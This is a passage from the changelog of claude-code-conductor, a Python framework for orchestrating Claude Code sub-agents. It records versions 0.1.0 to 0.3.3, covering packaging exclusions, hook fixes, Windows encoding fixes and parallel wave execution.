- `validate_skill_change.py`: Early-exit paths changed from
  `sys.exit(0)` to `return`; `__main__` block uses
  `sys.exit(main() or 0)` pattern, consistent with `pre_tool.py`.
- `clear_file_history.py`: Added `os.path.islink` pre-check so
  symbolic links are removed with `os.unlink` rather than
  `shutil.rmtree`, preventing accidental recursive deletion of a
  symlink target on some platforms.
- `worktree_guard.py`: Removed noisy `stderr` log on every tool call
  when `PO_WORKTREE_GUARD` is unset; the hook now exits silently when
  the guard is disabled.
- Template sync: all seven files under `src/c3/_template/.claude/hooks/`
  are now identical to their counterparts under `.claude/hooks/`, so
  `c3 init` / `c3 update` distribute the corrected implementations.

## [0.3.3] - 2026-05-01

### Fixed
- `__pycache__/` and `.pyc`/`.pyo` artefacts no longer ship in the
  wheel and no longer leak into user projects via `c3 init` /
  `c3 update`. Previous releases shipped Python bytecode caches at
  any path under `.claude/` whenever the dev had run hooks before
  the build (notably `.claude/hooks/__pycache__/*.pyc`). The
  `should_skip` predicate in both `c3._excludes` and `hatch_build.py`
  now short-circuits on any path component named `__pycache__` or
  any `.pyc` / `.pyo` suffix.
- `tests/test_excludes.py`: regression test
  `test_excludes_pycache_at_any_depth` asserts the new behaviour at
  multiple directory depths and confirms `.py` source files remain
  framework files.

## [0.3.2] - 2026-05-01

### Fixed
- `c3 update` and `c3 init` no longer overwrite the user's
  `.claude/settings.local.json`. This file is per-machine permission
  state that Claude Code edits when granting tool permissions; the
  bundled template should never replace it. `settings.local.json`
  is now in `EXCLUDE_PATTERNS` in both `c3._excludes` (used at
  runtime by `c3 init` / `c3 update`) and `hatch_build.py` (used at
  wheel-staging time so the file no longer ships in the wheel at
  all). The companion `settings.json` (project-shared permissions)
  remains a framework file and continues to be updated by
  `c3 update`.
- `tests/test_excludes.py`: regression test asserting the new
  exclusion.

## [0.3.1] - 2026-05-01

### Docs
- Operational rules captured from a 17-tasks / 7-stages C3+PO verification
  run in `c3_pip_test`:
  - `.claude/skills/wave-execution.md`: new **Step 0-pre** that requires a
    clean working tree before invoking PO (PO's auto-merge re-creates
    same-named files in worktrees and conflicts on dirty main — most
    commonly via `.claude/settings.local.json`, which Claude Code auto-edits
    when granting permissions). Adds an explicit **"do not git
    add/commit/push"** rule to case A-2 Agent-tool prompts (a developer
    sub-agent was committing implementation files while leaving Red tests
    and test-reports untracked). Adds an **auto-merge conflict (exit code
    3) recovery** sub-section under case B with a selective-checkout
    procedure that rescues only declared `writes` and discards worktree-
    side edits to surrounding files. Adds a per-wave commit reminder under
    Step 2-F. Notes PO's hardcoded 15-minute per-task timeout
    (`_INTERNAL_TIMEOUT_SEC = 900`, no manifest-level override) so the
    parent Claude can route exit-code-1 timeouts back to planner sizing
    rather than agent debugging.
  - `.claude/agents/planner.md`: documents the `depends_on: []` pitfall
    (`c3 po dry-run` rejects empty arrays — omit the field instead) and
    the `writes` collision detection. Adds a per-task time budget rule
    (≤15 min, matching PO's internal timeout) with a self-check item.
    Adds an **"alternating parallel/serial pattern"** section that
    authorises ordering `depends_on` between stages when the user
    explicitly wants intermediate review/sync points, while preserving
    in-stage parallelism ≥ 2.
  - `.claude/docs/parallel-orchestra-manifest.md`: adds an "alternating
    parallel/serial pattern" section describing the structure with a
    pointer to the planner rule.

No code changes — `c3 update` after `pip install -U claude-code-conductor`
brings these into existing projects.

## [0.3.0] - 2026-04-30

### Changed (breaking)
- `/develop` now auto-detects YAML frontmatter on the latest plan-report and
  switches between two modes:
  - **frontmatter present** → new "C3 main + PO spot" workflow. C3 walks the
    DAG wave-by-wave, asks for user approval before each wave, and dispatches
    each wave to the right runner: solo waves run on the C3 host (Agent-tool
    spawn for `code-reviewer` / `developer` / `tester`, parent-Claude persona
    adoption for `tdd-develop` to avoid the depth-1 nested-spawn limit), and
    multi-task waves are delegated to parallel-orchestra via an ephemeral
    wave-only manifest under `.claude/tmp/`.
  - **no frontmatter** → legacy D-1〜D-5 sequential TDD ceremony, unchanged.
- The previous "PO 全委譲" model (D-0 two-choice prompt) and
  `.claude/skills/parallel-execution.md` are removed. The new flow is
  documented in `.claude/skills/wave-execution.md`.

### Added
- `c3 po waves <plan-report>` — prints the topological wave decomposition of
  a manifest as JSON. Used by `wave-execution.md` to drive the per-wave loop.
- `c3 po run-wave <plan-report> --wave-index N` — generates a wave-only
  ephemeral manifest under `.claude/tmp/po-manifest-wave-{N}-{ts}.md` and
  hands it to parallel-orchestra.
- `c3.po.manifest.compute_waves(frontmatter)` — Kahn's-algorithm topological
  wave decomposition. Detects cycles, unknown dependency ids, and duplicate
  task ids.
- `c3.po.manifest.build_wave_manifest_text(frontmatter, wave_index)` —
  emits a parseable plan-report Markdown for one wave, dropping `depends_on`
  and webhook fields and decorating the manifest name with ` - wave N`.
- `tests/test_po_waves.py` (16 tests) and `tests/test_cli_po.py` (5 tests)
  covering wave decomposition, ephemeral-manifest generation, CLI exit
  codes, and frontmatter round-trip.

### Notes
- The persona-adoption pattern for `tdd-develop` in solo waves is the direct
  consequence of Claude Code's depth-1 nested-spawn limit (a sub-agent
  spawned via the Agent tool cannot itself spawn another sub-agent). For
  agents that internally spawn sub-agents (today: `tdd-develop`), the parent
  Claude reads the agent definition and adopts its persona instead. Other
  agents (`code-reviewer`, `security-reviewer`, `developer`, `tester`) keep
  using the standard Agent-tool spawn path.

## [0.2.4] - 2026-05-01

### Changed
- `planner` agent now produces plan-reports designed for actual parallel
  execution. Previously the agent only knew "emit YAML frontmatter"; without
  rules for how to design the dependency graph it tended to write conservative
  serial chains where every task depended on the previous one, defeating the
  point of parallel-orchestra. Added a "並列実行のための設計指針" section
  with eight concrete rules:
  - depends_on only for true dependencies (not "just to be safe")
  - serialization self-check: chain length ≦ tasks/2
  - reviews go to the end via depends_on covering all dev tasks
  - decompose at file/module boundaries, not function-level or module-level
  - 1 TDD task = test + production + correction loop (do not split)
  - default granularity: file / feature
  - `writes` field is mandatory for collision detection
  - duplicate writes must be merged, sequenced via depends_on, or grouped
- `.claude/docs/parallel-orchestra-manifest.md`: example expanded to three
  dev tasks + a depends-on-all reviewer (showing real parallelism), plus
  inline comments and an "アンチパターン" section that calls out
  serialized chains, splitting TDD into separate tester/developer tasks,
  and empty/duplicate `writes` fields.

## [0.2.3] - 2026-05-01

### Added
- `name` field on every agent definition under `.claude/agents/*.md`. The
  `description` field was already present on all agents, so this fills the
  remaining frontmatter gap. Values match the file stem (e.g. `architect`,
  `tdd-develop`).

## [0.2.2] - 2026-05-01

### Fixed
- `c3 po run` no longer crashes on Windows when parallel-orchestra emits UTF-8
  characters on stderr. The `subprocess.Popen` call previously paired
  `text=True` with no explicit `encoding`, so Python decoded the pipe with the
  platform's locale (cp932 on JP Windows) and raised `UnicodeDecodeError` on
  the first non-ASCII byte. The Popen now passes `encoding="utf-8",
  errors="replace"` so PO's output decodes regardless of locale and a stray
  byte cannot tear down the stream mid-run.

### Added
- `tests/test_po_run.py::test_run_manifest_decodes_stderr_as_utf8` —
  regression test that asserts the Popen kwargs include `encoding="utf-8"`
  and `errors="replace"`.

## [0.2.1] - 2026-05-01

### Fixed
- `c3 init` no longer copies personal/working files when run against the live
  development tree. Two regressions in 0.2.0 caused this:
  1. `templates_dir()` walked up from `__file__` looking for any ancestor with
     `.claude/` + `pyproject.toml`. A wheel install in a venv that happened to
     live inside the C3 source tree (e.g. `claude-code-conductor/.venv/...`)
     therefore resolved to the dirty live `.claude/` instead of the bundled
     `_template/`. The dev fallback is now anchored to `<root>/src/c3/` ancestry
     so site-packages-loaded copies always use `importlib.resources`.
  2. `_copytree` did not apply the same exclusion rules as the build hook,
     so even legitimate editable installs (which intentionally serve the live
     `.claude/`) could leak personal files. `cli_init` and `cli_update` now
     share `c3._excludes` with `hatch_build.py`.

### Added
- `src/c3/_excludes.py` — single source of truth for excluded paths
  (reports/, memory/sessions/, memory/patterns.json, docs/decisions.md, etc.).
- Regression tests:
  - `tests/test_paths.py` — `_resolve_dev_template` rejects site-packages paths.
  - `tests/test_excludes.py` — KEEP_PATTERNS override EXCLUDE_PATTERNS.
  - `tests/test_cli_init.py::test_init_excludes_personal_files` — init does not
    leak personal files even when given a "dirty" template tree.

## [0.2.0] - 2026-05-01

### Added
- PyPI distribution as `claude-code-conductor` (`pip install claude-code-conductor`)
- `c3` command-line interface with subcommands:
  - `c3 init` — scaffold `.claude/` into a project (refuses to overwrite without `--force`)
  - `c3 update` — refresh framework files; preserves user-managed files (reports/, memory/sessions/, founding docs)
  - `c3 list-agents` / `list-skills` / `list-commands` — inspect installed assets
  - `c3 doctor` — diagnose `.claude/`, `settings.json`, claude binary, parallel-orchestra availability
  - `c3 po dry-run <plan-report>` / `c3 po run <plan-report>` — invoke parallel-orchestra via subprocess
- Optional `parallel-orchestra` integration (loose coupling; PO is *not* in dependencies):
  - Runtime detection via `shutil.which` + `importlib.metadata`
  - `.claude/skills/parallel-execution.md` skill orchestrates D-0 → preflight → user approval → run → report
  - `planner` agent now emits required YAML frontmatter on plan-reports per `.claude/docs/parallel-orchestra-manifest.md`
  - `/develop` Phase D adds **D-0: 実行モード選択** (TDD 逐次 vs PO 並列)

### Changed
- Recommended install path is now `pip install claude-code-conductor` + `c3 init`. Manual `cp -r .claude/` still documented as an alternative.
- `worktree_guard.py` docstring: `C3_WORKTREE_GUARD` → `PO_WORKTREE_GUARD` (matches the implementation).

### Internal
- `src/c3/` package layout (hatchling build backend)
- Hatch custom build hook stages distributable subset of `.claude/` into `src/c3/_template/.claude/`
- Test suite under `tests/` (28 tests including loose-coupling guards and an opt-in `parallel-orchestra --dry-run` smoke)

## [0.1.0] - 2026-04-29

### Added
- Initial Claude Code Conductor (C3) framework structure
- Multi-agent orchestration with parent-Claude-persona pattern
- Structured approval flow using `AskUserQuestion` tool
- `/init-session` — session initialization and state restoration
- `/start` — development workflow entry (interviewing → design → planning)
- `/develop` — implementation phase with TDD (tester → developer → tester)
- `/review` — review phase (code-reviewer + security-reviewer)
- `/promote-pattern` — promote candidate patterns to rules/skills
- `/doc` — architecture diagram and documentation generation
- `/mcp` — MCP server management (add / list / remove)
- `/extract-lib` — cross-project common code extraction and library design
- Code review checklist (`rules/code-review-checklist.md`)
- Security review checklist (`rules/security-review-checklist.md`)
- Hooks: `pre_tool.py`, `stop.py`, `log_agent.py`, `validate_skill_change.py`, `pre_compact.py`, `statusline.py`
- Session memory system with pattern trust scoring

### Fixed
- Force UTF-8 encoding on stdout/stderr for all hooks (Windows compatibility)
- Block `cd` commands in `pre_tool` hook to prevent CWD drift that breaks hook resolution
- Exclude all report/tmp file types from git tracking
